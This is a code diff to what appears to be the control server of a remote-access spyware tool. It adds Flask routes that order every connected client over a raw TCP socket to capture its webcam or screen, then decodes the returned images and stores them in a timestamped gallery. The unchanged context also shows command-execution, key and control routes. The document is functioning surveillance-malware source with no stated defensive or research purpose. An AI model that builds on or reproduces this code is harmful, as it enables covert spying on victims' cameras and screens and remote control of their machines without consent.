@@ -1,3 +1,4 @@
+
 import socket
 import threading
 import asyncio
@@ -5,9 +6,15 @@ import websockets
 import base64
 import logging
 import time
-from flask import Flask, render_template, request, send_file, redirect, url_for
-from flask_cors import CORS
 import os
+from datetime import datetime
+import json
+from flask import Flask, render_template, request, send_file, redirect, url_for, send_from_directory
+from flask_cors import CORS
+
+# --- Flask App Initialization ---
+app = Flask(__name__)
+CORS(app)
 
 # --- Configuration ---
 HOST = "0.0.0.0"
@@ -28,6 +35,27 @@ frame_lock = threading.Lock()
 cmd_lock = threading.Lock()
 key_lock = threading.Lock()
 browser_ws_clients = set()
+
+# Metadata file for images
+IMAGE_METADATA_FILE = os.path.join(os.path.dirname(__file__), "images", "metadata.json")
+
+def save_image_metadata(filename, device, timestamp):
+    os.makedirs(os.path.dirname(IMAGE_METADATA_FILE), exist_ok=True)
+    try:
+        if os.path.exists(IMAGE_METADATA_FILE):
+            with open(IMAGE_METADATA_FILE, "r") as f:
+                data = json.load(f)
+        else:
+            data = []
+    except Exception:
+        data = []
+    data.append({
+        "filename": filename,
+        "device": device,
+        "time": timestamp
+    })
+    with open(IMAGE_METADATA_FILE, "w") as f:
+        json.dump(data, f)
 
 # --- TCP Server Setup ---
 tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -70,23 +98,119 @@ def command():
         output = cmd_output
     return render_template("command.html", output=output)
 
-@app.route("/webcam")
+@app.route("/webcam", methods=["GET", "POST"])
 def webcam():
+    global clients
+    if request.method == "POST":
+        # Send webcam capture command to all clients
+        for client in clients:
+            try:
+                client.send(b"CMD:WEBCAM")
+            except Exception as e:
+                logging.error(f"Send WEBCAM CMD failed: {e}")
+        time.sleep(0.5)
     with frame_lock:
         frame = latest_frame
     if frame:
-        return render_template("webcam.html", image_data=frame.decode())
+        # Clean up the base64 string
+        if isinstance(frame, bytes):
+            frame = frame.decode(errors="ignore")
+        frame_clean = frame.replace('\n', '').replace('\r', '').strip()
+        try:
+            img_data = base64.b64decode(frame_clean + '=' * (-len(frame_clean) % 4))
+        except Exception as e:
+            logging.error(f"Base64 decode error: {e}")
+            return render_template("webcam.html", image_data=None)
+        img_dir = os.path.join(os.path.dirname(__file__), "images")
+        os.makedirs(img_dir, exist_ok=True)
+        device = "Unknown"
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        filename = f"webcam_{timestamp}.jpg"
+        img_path = os.path.join(img_dir, filename)
+        with open(img_path, "wb") as f:
+            f.write(img_data)
+        save_image_metadata(filename, device, timestamp)
+        return render_template("webcam.html", image_data=frame_clean)
     return render_template("webcam.html", image_data=None)
+
+# --- Screenshot Capture Page ---
+@app.route("/screenshot_capture", methods=["GET", "POST"])
+def screenshot_capture():
+    image_url = None
+    timestamp = None
+    device = None
+    if request.method == "POST":
+        # Send screenshot command to all clients
+        for client in clients:
+            try:
+                client.send(b"CMD:SCREENSHOT")
+            except Exception as e:
+                logging.error(f"Send SCREENSHOT CMD failed: {e}")
+        # Wait for client to send screenshot (should be handled in handle_client)
+        time.sleep(0.5)
+        # Find the latest screenshot in images folder
+        img_dir = os.path.join(os.path.dirname(__file__), "images")
+        screenshots = [f for f in os.listdir(img_dir) if f.startswith("screenshot_") and f.endswith(".jpg")]
+        if screenshots:
+            latest = max(screenshots, key=lambda x: os.path.getctime(os.path.join(img_dir, x)))
+            image_url = url_for("serve_image", filename=latest)
+            timestamp = latest.replace("screenshot_", "").replace(".jpg", "")
+            device = "Unknown"
+    return render_template("screenshot_capture.html", image_url=image_url, timestamp=timestamp, device=device)
+
+# --- Webcam Capture Page ---
+@app.route("/webcam_capture", methods=["GET", "POST"])
+def webcam_capture():
+    image_url = None
+    timestamp = None
+    device = None
+    if request.method == "POST":
+        # Send webcam command to all clients
+        for client in clients:
+            try:
+                client.send(b"CMD:WEBCAM")
+            except Exception as e:
+                logging.error(f"Send WEBCAM CMD failed: {e}")
+        time.sleep(0.5)
+        # Find the latest webcam image in images folder
+        img_dir = os.path.join(os.path.dirname(__file__), "images")
+        webcams = [f for f in os.listdir(img_dir) if f.startswith("webcam_") and f.endswith(".jpg")]
+        if webcams:
+            latest = max(webcams, key=lambda x: os.path.getctime(os.path.join(img_dir, x)))
+            image_url = url_for("serve_image", filename=latest)
+            timestamp = latest.replace("webcam_", "").replace(".jpg", "")
+            device = "Unknown"
+    return render_template("webcam_capture.html", image_url=image_url, timestamp=timestamp, device=device)
 
 @app.route("/download_webcam")
 def download_webcam():
     with frame_lock:
         if latest_frame:
             img_data = base64.b64decode(latest_frame)
-            with open("webcam_snapshot.jpg", "wb") as f:
+            img_dir = os.path.join(os.path.dirname(__file__), "images")
+            os.makedirs(img_dir, exist_ok=True)
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            img_path = os.path.join(img_dir, f"webcam_{timestamp}.jpg")
+            with open(img_path, "wb") as f:
                 f.write(img_data)
-            return send_file("webcam_snapshot.jpg", as_attachment=True)
+            return send_file(img_path, as_attachment=True)
     return ("", 204)
+# Serve images statically
+from flask import send_from_directory
+
+@app.route("/images/<filename>")
+def serve_image(filename):
+    img_dir = os.path.join(os.path.dirname(__file__), "images")
+    return send_from_directory(img_dir, filename)
+
+# Images gallery page
+@app.route("/images_gallery")
+def images_gallery():
+    images = []
+    if os.path.exists(IMAGE_METADATA_FILE):
+        with open(IMAGE_METADATA_FILE, "r") as f:
+            images = json.load(f)
+    return render_template("images.html", images=images)
 
 @app.route("/control", methods=["GET", "POST"])
 def control():
@@ -156,6 +280,21 @@ def handle_client(client_socket):
                 with frame_lock:
                     global latest_frame
                     latest_frame = img_data.encode()
+            if data.startswith(b"SCREENSHOT:"):
+                img_data = data[len("SCREENSHOT:"):].decode()
+                # Save screenshot to images folder
+                img_dir = os.path.join(os.path.dirname(__file__), "images")
+                os.makedirs(img_dir, exist_ok=True)
+                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                filename = f"screenshot_{timestamp}.jpg"
+                img_path = os.path.join(img_dir, filename)
+                try:
+                    img_bytes = base64.b64decode(img_data + '=' * (-len(img_data) % 4))
+                    with open(img_path, "wb") as f:
+                        f.write(img_bytes)
+                    save_image_metadata(filename, "Unknown", timestamp)
+                except Exception as e:
+                    logging.error(f"Failed to save screenshot: {e}")
             else:
                 logging.info(f"Received: {data[:50]}")
         except Exception as e:
